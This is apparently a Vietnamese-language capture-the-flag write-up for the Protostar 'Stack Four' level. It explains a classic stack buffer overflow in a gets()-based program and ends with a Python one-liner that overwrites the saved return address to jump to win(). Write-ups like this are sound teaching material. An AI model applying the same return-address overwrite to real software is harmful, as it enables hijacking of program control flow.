# STACK FOUR

## About

Stack4 takes a look at overwriting saved EIP and standard buffer overflows.

This level is at /opt/protostar/bin/stack4

Hints

  * A variety of introductory papers into buffer overflows may help.
 
  * gdb lets you do “run < input”
 
 * EIP is not directly after the end of buffer, compiler padding can also increase the size.

## Source code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## Solutions

`STACK FOUR` là thử thách sẽ bắt đầu xem xét việc nếu như buffer overflow không chỉ ghi đè giá trị của các biến trên STACK mà còn ghi đè những thứ khác có trên STACK.

Trước đó chúng ta sẽ xem lại cấu trúc Stack memory và code Assembly hàm main của chương trình qua gdb:

```
  |  high memory adddress
  | |====================| 
  | |   name-arguments   |  ^
  | |====================|  | buffer
  S |   return address   |  | fill
  t |====================|  | direction
  a |  base-pointer|'''''|  |
  c |==============|'''''|  |
  k |''''''''''''''''''''|  |
  | |'''''''buffer'''''''|  |
  | |''''''''''''''''''''|  |
  | |====================|  |
  | |                    |  |
  | |....................|
      low memory address
```
Code Assembly:

```Asm
root@protostar:/opt/protostar/bin# gdb -q ./stack4                                                      
Reading symbols from /opt/protostar/bin/stack4...done.                                                  
(gdb) set disassembly-flavor intel                                                                      
(gdb) disass main                                                                                       
Dump of assembler code for function main:                                                               
0x08048408 <main+0>:    push   ebp                                                                      
0x08048409 <main+1>:    mov    ebp,esp                                                                  
0x0804840b <main+3>:    and    esp,0xfffffff0                                                           
0x0804840e <main+6>:    sub    esp,0x50                                                                 
0x08048411 <main+9>:    lea    eax,[esp+0x10]                                                           
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax                                                      
0x08048418 <main+16>:   call   0x804830c <gets@plt>                                                     
0x0804841d <main+21>:   leave                                                                           
0x0804841e <main+22>:   ret                                                                             
End of assembler dump.                                                                                  
(gdb) 
```

Khi một hàm được gọi nó sẽ lưu trên stack địa chỉ trả về của hàm `(return address)` sau đó là đến EBP `(base pointer)` - tương ứng với 3 dòng đầu của code asm (phần prolog), rồi tiếp theo là các hoạt động khác như biến, giá trị tham chiếu đến hay là tiếp tục gọi đến các hàm con khác.

Khi thực thi xong mã trong hàm, cuối mỗi hàm là câu lệnh `ret` nó sẽ nhảy đến giá trị địa chỉ ở đỉnh stack - sau khi thực thi xong mã tại đó là return address và chuyển flow chương trình về địa chỉ đó. Cụ thể hơn là nó gán giá trị của `EIP` (Extended instruction pointer) = return address.

Nghĩa là nếu ta dùng hàm gets nhập một lượng đủ lớn ký tự input ta có thể overwrite Return address và điều khiển flow chương trình thông qua giá trị ghi đè.

Vậy bao nhiêu là đủ lớn ???

Chúng ta sẽ thử đầu vào (ít nhất nó cũng phải vượt qua khả năng chứa của `buffer`) và debug trong gdb như sau:

```
root@protostar:/opt/protostar/bin# python -c 'print "A" * 64 + "B" * 4 + "C" * 4 + "D" * 4 + "E" * 4 + "F" * 4 + "G" * 4' > txt                                         
root@protostar:/opt/protostar/bin# gdb -q ./stack4                                                      
Reading symbols from /opt/protostar/bin/stack4...done.                                                  
(gdb) set disassembly-flavor intel                                                                      
(gdb) r < txt                                                                                           
Starting program: /opt/protostar/bin/stack4 < txt                                                                                                                                                               
Program received signal SIGSEGV, Segmentation fault.                                                    
0x45454545 in ?? ()        <--- EEEE                                                                                   
(gdb) 
```

Như ta thấy chương trình nhảy về địa chỉ 0x45454545 (EEEE) báo lỗi nghĩa là tôi đã ghi đè lên EIP bằng một giá trị 0x45454545.

Bây giờ ta tiến hành tìm địa chỉ hàm win

```
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
(gdb)
```

Bước khai thác cuối cùng

```
root@protostar:/opt/protostar/bin# python -c 'print "A" * 76 + "\xf4\x83\x04\x08"' | ./stack4
code flow successfully changed
Segmentation fault
root@protostar:/opt/protostar/bin#
```

## Documents

<https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/>

<https://www.coengoedegebure.com/buffer-overflow-attacks-explained/>

<https://en.wikipedia.org/wiki/Endianness>


